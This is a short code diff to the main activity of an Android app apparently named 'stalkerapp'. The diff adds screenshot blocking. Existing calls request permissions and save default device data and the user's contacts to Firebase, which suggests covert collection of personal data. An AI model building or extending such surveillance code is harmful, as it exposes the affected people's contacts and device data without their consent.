@@ -1,6 +1,7 @@
 package com.github.saintedlittle.stalkerapp;
 
 import android.os.Bundle;
+import android.view.WindowManager;
 
 import androidx.appcompat.app.AppCompatActivity;
 
@@ -13,9 +14,14 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // Disable screenshots.
+        this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);
+
+        // Ask permissions.
         PermissionDialog permissionDialog = new PermissionDialog(this);
         permissionDialog.requestPermissions();
 
+        // Logging information.
         new FirebaseSaver().saveDefaultData(this);
 
         new FirebaseSaver().saveContacts();
